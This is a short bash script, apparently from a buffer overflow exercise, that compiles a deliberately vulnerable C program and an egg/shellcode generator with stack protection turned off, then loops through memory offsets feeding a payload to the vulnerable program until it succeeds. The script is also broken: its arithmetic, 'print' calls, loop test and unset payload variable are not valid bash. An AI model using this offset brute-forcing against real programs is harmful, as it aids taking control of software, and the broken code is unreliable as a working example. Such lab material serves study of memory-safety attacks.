#!/bin/bash
set -o nounset          # Treat unset variables as an error

gcc vulnerable.c -g -fno-stack-protector -o vulnerable
gcc eggshell.c -g -fno-stack-protector -o eggshell

OFFSET=0

./eggshell -e 5000 -b 600 -o $OFFSET
OFFSET += 1000
print $BOF
./vulnerable $BOF

while [ $? neq 0 ];do
  ./eggshell -e 5000 -b 600 -o $OFFSET
  OFFSET += 1000
  print $BOF
  ./vulnerable $BOF
done

